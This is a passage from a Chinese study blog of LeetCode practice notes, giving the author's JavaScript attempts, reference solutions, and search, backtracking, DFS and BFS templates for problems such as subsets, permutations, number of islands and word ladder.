(nums[<span class="number">0</span>] &gt; nums[mid] &amp;&amp; (target &gt; nums[mid] &amp;&amp; target &lt; nums[<span class="number">0</span>])) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[left] === target ? left : -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC，但是调试了很久才写出来。二分的思路有变化，需要多考虑一些情况。<strong>同时需注意</strong>可以先判断 nums 数组有零个或者一个元素的情况。</p><h2 id="LeetCode74——搜索二维矩阵（☆☆）"><a href="#LeetCode74——搜索二维矩阵（☆☆）" class="headerlink" title="LeetCode74——搜索二维矩阵（☆☆）"></a>LeetCode74——搜索二维矩阵（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/search-a-2d-matrix/">跳转地址</a></p><h3 id="自己的代码-5"><a href="#自己的代码-5" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> searchMatrix = <span class="function"><span class="keyword">function</span>(<span class="params">matrix, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> a <span class="keyword">of</span> matrix) &#123;</span><br><span class="line">        arr.push(...a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>, right = arr.length;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">let</span> mid = <span class="built_in">parseInt</span>((left + right) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] &gt;= target) &#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr[right] === target;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC，很简单的想法，变成升序的数组后二分查找。复杂度O（n）。</p><h3 id="思路-amp-题解-3"><a href="#思路-amp-题解-3" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">searchMatrix</span>(<span class="params">matrix, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!matrix.length || !matrix[<span class="number">0</span>].length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> row = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> col = matrix[<span class="number">0</span>].length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (col &gt;= <span class="number">0</span> &amp;&amp; row &lt;= matrix.length - <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (matrix[row][col] === target) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (matrix[row][col] &gt; target) col--;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (matrix[row][col] &lt; target) row++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>好像这样更精简些。</p><h1 id="分治-amp-回溯"><a href="#分治-amp-回溯" class="headerlink" title="分治&amp;回溯"></a>分治&amp;回溯</h1><p>分治模板：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">divide_conquer</span>(<span class="params">problem, param1, param2, ...</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// recursion terminator</span></span><br><span class="line">    <span class="keyword">if</span> (problem is None) &#123;</span><br><span class="line">        print_result</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prepare data (拆分子问题)</span></span><br><span class="line">    data = prepare_data(problem);</span><br><span class="line">    subproblems = split_problem(problem, data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// conquer subproblems (drill down)</span></span><br><span class="line">    subresult1 = divide_conquer(subproblems[<span class="number">0</span>], p1, ...);</span><br><span class="line">    subresult2 = divide_conquer(subproblems[<span class="number">1</span>], p2, ...);</span><br><span class="line">    subresult3 = divide_conquer(subproblems[<span class="number">2</span>], p3, ...);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// process and generate the final result </span></span><br><span class="line">    result = process_result(subresult1, subresult2, subresult3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// revert the current level states(回复当前层状态)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回溯模板：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">result = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backtrack</span> (<span class="params">path, list</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (满足条件) &#123;</span><br><span class="line">        result.push(path);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> () &#123;</span><br><span class="line">        <span class="comment">// 做选择(前序遍历)</span></span><br><span class="line">        backtrack (path, list)</span><br><span class="line">        <span class="comment">// 撤销选择(后续遍历)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode50——Pow-x-n-（☆☆）"><a href="#LeetCode50——Pow-x-n-（☆☆）" class="headerlink" title="LeetCode50——Pow(x, n)（☆☆）"></a>LeetCode50——Pow(x, n)（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/powx-n/">跳转地址</a></p><h3 id="自己的代码-6"><a href="#自己的代码-6" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myPow = <span class="function"><span class="keyword">function</span> (<span class="params">x, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="number">1</span>;</span><br><span class="line">    x = n &gt; <span class="number">0</span> ? x : <span class="number">1</span> / x;</span><br><span class="line">    n = n &gt; <span class="number">0</span> ? n : -n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        res *= x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>没过。时间复杂度O(N)，但是已经超过运行时间了。</p><h3 id="思路-amp-题解-4"><a href="#思路-amp-题解-4" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>分治：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myPow = <span class="function"><span class="keyword">function</span> (<span class="params">x, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> pow = <span class="built_in">Math</span>.abs(n);</span><br><span class="line">    <span class="comment">// 使用分治：n是奇数，x的n次方等于 x*x的n-1次方(转化为偶数)；n是偶数 等于（x*x）的n/2次方</span></span><br><span class="line">    <span class="keyword">let</span> result = pow % <span class="number">2</span> === <span class="number">0</span> ? myPow(x * x, pow / <span class="number">2</span>) : x * myPow(x * x, (pow - <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> n &lt; <span class="number">0</span> ? <span class="number">1</span> / result : result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode78——子集（☆☆）"><a href="#LeetCode78——子集（☆☆）" class="headerlink" title="LeetCode78——子集（☆☆）"></a>LeetCode78——子集（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/subsets/">跳转地址</a></p><h3 id="自己的代码-7"><a href="#自己的代码-7" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> subsets = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [[]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> num <span class="keyword">in</span> nums) &#123;</span><br><span class="line">        <span class="keyword">let</span> arr = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> subset <span class="keyword">in</span> res) &#123;</span><br><span class="line">            arr.push(subset + [num]);</span><br><span class="line">        &#125;</span><br><span class="line">        res.push(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>没过。感觉还是少用 for in 吧</p><h3 id="思路1-amp-题解-1"><a href="#思路1-amp-题解-1" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>迭代：依次把每个元素插入到之前的集合中生成新的结果集合。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> subsets = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [[]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> arr = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; res.length; j++) &#123;</span><br><span class="line">            arr.push([...res[j], nums[i]]);</span><br><span class="line">        &#125;</span><br><span class="line">        res.push(...arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 更优写法 forEach</span></span><br><span class="line"><span class="keyword">var</span> subsets = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> res = [[]]</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">res.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">res.push([...item, nums[i]])</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>空间复杂度: O(n*2^n)</li></ul><h3 id="思路2-amp-题解（good）"><a href="#思路2-amp-题解（good）" class="headerlink" title="思路2&amp;题解（good）"></a>思路2&amp;题解（good）</h3><p>分治：（+回溯）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> subsets = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> res = []</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backtrack</span>(<span class="params">index, curr</span>) </span>&#123;</span><br><span class="line">res.push(curr)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = index; i &lt; nums.length; i++) &#123;</span><br><span class="line">backtrack(i + <span class="number">1</span>, [...curr, nums[i]])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">backtrack(<span class="number">0</span>, [])</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>深度先遍历第一个数，再往后推。</p><h2 id="LeetCode77——组合（☆☆）"><a href="#LeetCode77——组合（☆☆）" class="headerlink" title="LeetCode77——组合（☆☆）"></a>LeetCode77——组合（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/combinations/">跳转地址</a></p><h3 id="自己的代码-8"><a href="#自己的代码-8" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> combine = <span class="function"><span class="keyword">function</span>(<span class="params">n, k</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> res = []</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backtrack</span>(<span class="params">index, curr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (curr.length === k) &#123;</span><br><span class="line">            res.push(curr)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = index; i &lt;= n; i++) &#123;</span><br><span class="line">backtrack(i + <span class="number">1</span>, [...curr, i])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">backtrack(<span class="number">1</span>, [])</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AC，对照78思路，勉强能做，但是重新开始就不一定。</p><h2 id="LeetCode17——电话号码的字母组合（☆☆）"><a href="#LeetCode17——电话号码的字母组合（☆☆）" class="headerlink" title="LeetCode17——电话号码的字母组合（☆☆）"></a>LeetCode17——电话号码的字母组合（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/">跳转地址</a></p><h3 id="自己的代码-9"><a href="#自己的代码-9" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> letterCombinations = <span class="function"><span class="keyword">function</span>(<span class="params">digits</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (digits === <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 直接 const map = &#123;2: &#x27;abc&#x27;, 3: &#x27;def&#x27;...&#125;</span></span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(), res = [];</span><br><span class="line">map.set(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;def&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;4&quot;</span>, <span class="string">&quot;ghi&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;5&quot;</span>, <span class="string">&quot;jkl&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;mno&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;7&quot;</span>, <span class="string">&quot;pqrs&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;8&quot;</span>, <span class="string">&quot;tuv&quot;</span>);</span><br><span class="line">map.set(<span class="string">&quot;9&quot;</span>, <span class="string">&quot;wxyz&quot;</span>);</span><br><span class="line"><span class="comment">// s为每一次回溯的字符串，level为个数</span></span><br><span class="line"><span class="keyword">const</span> search = <span class="function"><span class="keyword">function</span> (<span class="params">s, level</span>) </span>&#123;</span><br><span class="line"><span class="comment">// 1.终止条件 terminator</span></span><br><span class="line"><span class="keyword">if</span> (level === digits.length) &#123;</span><br><span class="line">res.push(s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.单层递归逻辑 process</span></span><br><span class="line"><span class="keyword">let</span> letter = map.get(digits[level]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; letter.length; i++)&#123;</span><br><span class="line"><span class="comment">// drill down</span></span><br><span class="line">search(s + letter[i], level + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">search(<span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC</p><h2 id="LeetCode46——全排列（☆☆）"><a href="#LeetCode46——全排列（☆☆）" class="headerlink" title="LeetCode46——全排列（☆☆）"></a>LeetCode46——全排列（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/permutations/">跳转地址</a></p><h3 id="自己的代码-10"><a href="#自己的代码-10" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> permute = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [];</span><br><span class="line">    <span class="keyword">let</span> len = nums.length;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">back</span>(<span class="params">index, arr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index === len) &#123;</span><br><span class="line">            res.push(arr);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="comment">// 注意此时back应该为index+1，若为i+1，则不是全排列</span></span><br><span class="line">            <span class="keyword">if</span> (arr.indexOf(nums[i]) === -<span class="number">1</span>) &#123;</span><br><span class="line">                back(index + <span class="number">1</span>, [...arr, nums[i]]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    back(<span class="number">0</span>, []);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC。但这样的方法解不了47</p><h2 id="LeetCode47——全排列Ⅱ（☆☆）"><a href="#LeetCode47——全排列Ⅱ（☆☆）" class="headerlink" title="LeetCode47——全排列Ⅱ（☆☆）"></a>LeetCode47——全排列Ⅱ（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/permutations-ii/">跳转地址</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> permuteUnique = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> res = [], remain = [], set = <span class="keyword">new</span> <span class="built_in">Set</span>(nums);</span><br><span class="line">    nums.forEach(<span class="function"><span class="params">num</span> =&gt;</span> remain[num] ? remain[num]++ : remain[num] = <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dfs</span>(<span class="params">depth, cur</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == nums.length) &#123;</span><br><span class="line">            res.push(cur.slice());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> num <span class="keyword">of</span> set) &#123;</span><br><span class="line">            <span class="keyword">if</span> (remain[num]) &#123;</span><br><span class="line">                cur.push(num);</span><br><span class="line">                remain[num]--;</span><br><span class="line">                <span class="comment">// move to the next depth</span></span><br><span class="line">                dfs(depth + <span class="number">1</span>, cur);</span><br><span class="line">                <span class="comment">// backtrack to previous state</span></span><br><span class="line">                cur.pop();</span><br><span class="line">                remain[num]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dfs(<span class="number">0</span>, []);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="剑指Offer51——数组中的逆序对（☆☆☆）"><a href="#剑指Offer51——数组中的逆序对（☆☆☆）" class="headerlink" title="剑指Offer51——数组中的逆序对（☆☆☆）"></a>剑指Offer51——数组中的逆序对（☆☆☆）</h2><p><a href="https://leetcode-cn.com/problems/shu-zu-zhong-de-ni-xu-dui-lcof/">跳转地址</a></p><p>好难啊。</p><h1 id="剪枝"><a href="#剪枝" class="headerlink" title="剪枝"></a>剪枝</h1><h2 id="LeetCode51——N皇后（☆☆☆）todo！"><a href="#LeetCode51——N皇后（☆☆☆）todo！" class="headerlink" title="LeetCode51——N皇后（☆☆☆）todo！"></a>LeetCode51——N皇后（☆☆☆）todo！</h2><p><a href="https://leetcode-cn.com/problems/n-queens/">跳转地址</a></p><p>看视频！还有位运算的解法。</p><h2 id="LeetCode37——解数独（☆☆☆）todo！"><a href="#LeetCode37——解数独（☆☆☆）todo！" class="headerlink" title="LeetCode37——解数独（☆☆☆）todo！"></a>LeetCode37——解数独（☆☆☆）todo！</h2><p><a href="https://leetcode-cn.com/problems/sudoku-solver/#/description">跳转地址</a></p><p>14课2</p><h1 id="BFS、DFS"><a href="#BFS、DFS" class="headerlink" title="BFS、DFS"></a>BFS、DFS</h1><h2 id="DFS-递归模板"><a href="#DFS-递归模板" class="headerlink" title="DFS 递归模板"></a>DFS 递归模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">visited = <span class="built_in">set</span>();</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">node, visited</span>):</span></span><br><span class="line">  <span class="keyword">if</span> node <span class="keyword">in</span> visited:</span><br><span class="line">    <span class="comment"># terminator already visited</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">  visited.add(node);</span><br><span class="line">  <span class="comment"># process current node here</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> next_node <span class="keyword">in</span> node.children():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> next_node <span class="keyword">in</span> visited:</span><br><span class="line">      dfs(next_node,visited)</span><br></pre></td></tr></table></figure><h2 id="DFS-非递归模板"><a href="#DFS-非递归模板" class="headerlink" title="DFS 非递归模板"></a>DFS 非递归模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">self, tree</span>):</span></span><br><span class="line">  <span class="keyword">if</span> tree.root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">  visited, stack = [], [tree.root]  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> stack:</span><br><span class="line">    node = stack.pop()</span><br><span class="line">    visited.add(node)</span><br><span class="line">    </span><br><span class="line">    process(node)</span><br><span class="line">    nodes=generate_related_nodes(node)</span><br><span class="line">    stack.push(nodes)</span><br></pre></td></tr></table></figure><h2 id="BFS-模板"><a href="#BFS-模板" class="headerlink" title="BFS 模板"></a>BFS 模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bfs</span>(<span class="params">graph, start,end</span>):</span></span><br><span class="line">  queue = []</span><br><span class="line">  queue.append([start])</span><br><span class="line">  visited.add(start)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> queue:</span><br><span class="line">    node = queue.pop()</span><br><span class="line">    visited.add(node)</span><br><span class="line">    </span><br><span class="line">    process(node)</span><br><span class="line">    nodes=generate_related_nodes(node)</span><br><span class="line">    queue.push(nodes)</span><br></pre></td></tr></table></figure><h2 id="递归-模板"><a href="#递归-模板" class="headerlink" title="递归 模板"></a>递归 模板</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">recur</span>(<span class="params">level, param</span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// terminator</span></span><br><span class="line">    <span class="keyword">if</span> (level &gt; MAX_LEVEL) &#123;</span><br><span class="line">        <span class="comment">// process result</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// process current logic</span></span><br><span class="line">    process(level, param);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// drill down</span></span><br><span class="line">    recur(level + <span class="number">1</span>, newParam);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// restore current status</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode200——岛屿数量（☆☆）"><a href="#LeetCode200——岛屿数量（☆☆）" class="headerlink" title="LeetCode200——岛屿数量（☆☆）"></a>LeetCode200——岛屿数量（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/number-of-islands/">跳转地址</a></p><h3 id="思路-amp-题解-5"><a href="#思路-amp-题解-5" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>沉岛思想：遇到岛屿时，岛屿数量+1； 且将相邻所有陆地变为0，直至遍历完整个网格。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> numIslands = <span class="function"><span class="keyword">function</span>(<span class="params">grid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> islands = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> dfs = <span class="function"><span class="keyword">function</span> (<span class="params">i, j</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= grid.length || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].length || grid[i][j] === <span class="string">&#x27;0&#x27;</span>)  <span class="keyword">return</span>;</span><br><span class="line">        grid[i][j] = <span class="string">&#x27;0&#x27;</span>; </span><br><span class="line">        dfs(i + <span class="number">1</span>, j);</span><br><span class="line">        dfs(i, j + <span class="number">1</span>);</span><br><span class="line">        dfs(i - <span class="number">1</span>, j);</span><br><span class="line">        dfs(i, j - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; grid.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; grid[i].length; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (grid[i][j] === <span class="string">&#x27;0&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">            dfs(i, j);</span><br><span class="line">            islands++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> islands;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Two-ended-BFS"><a href="#Two-ended-BFS" class="headerlink" title="Two-ended BFS"></a>Two-ended BFS</h2><h2 id="LeetCode127——单词接龙（☆☆☆）（to-redo）"><a href="#LeetCode127——单词接龙（☆☆☆）（to-redo）" class="headerlink" title="LeetCode127——单词接龙（☆☆☆）（to redo）"></a>LeetCode127——单词接龙（☆☆☆）（to redo）</h2><p><a href="https://leetcode-cn.com/problems/word-ladder/">跳转地址</a></p><p>（其实挺好想的，为什么最开始写的时候想不出呢）</p><h3 id="思路1-amp-题解-2"><a href="#思路1-amp-题解-2" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>BFS代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ladderLength = <span class="function"><span class="keyword">function</span>(<span class="params">beginWord, endWord, wordList</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 换成哈希表，更快捷的查找单词是否存在。List——O(n);HashSet——O(1)</span></span><br><span class="line">  <span class="keyword">let</span> wordSet = <span class="keyword">new</span> <span class="built_in">Set</span>(wordList);</span><br><span class="line">  <span class="keyword">let</span> queue = [];</span><br><span class="line">  queue.push([beginWord, <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">    <span class="keyword">let</span> [word, level] = queue.shift();</span><br><span class="line">    <span class="keyword">if</span> (word === endWord) &#123;</span><br><span class="line">      <span class="keyword">return</span> level;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; word.length; i++)&#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> c = <span class="number">97</span>; c &lt;= <span class="number">122</span>; c++)&#123;</span><br><span class="line">        <span class="keyword">let</span> newWord = word.slice(<span class="number">0</span>, i) + <span class="built_in">String</span>.fromCharCode(c) + word.slice(i + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (wordSet.has(newWord)) &#123;</span><br><span class="line">          queue.push([newWord, level + <span class="number">1</span>]);</span><br><span class="line">          <span class="comment">// 避免该词重复入列</span></span><br><span class="line">          wordSet.delete(newWord);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-1"><a href="#思路2-amp-题解-1" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>双端BFS</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ladderLength = <span class="function"><span class="keyword">function</span>(<span class="params">beginWord, endWord, wordList</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> wordListSet = <span class="keyword">new</span> <span class="built_in">Set</span>(wordList);</span><br><span class="line">  <span class="keyword">if</span>(!wordListSet.has(endWord))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> beginSet = <span class="keyword">new</span> <span class="built_in">Set</span>(), endSet = <span class="keyword">new</span> <span class="built_in">Set</span>(), level=<span class="number">1</span>;</span><br><span class="line">  beginSet.add(beginWord);</span><br><span class="line">  endSet.add(endWord);</span><br><span class="line">  <span class="comment">// BFS starts here</span></span><br><span class="line">  <span class="keyword">while</span> (beginSet.size) &#123;</span><br><span class="line">    <span 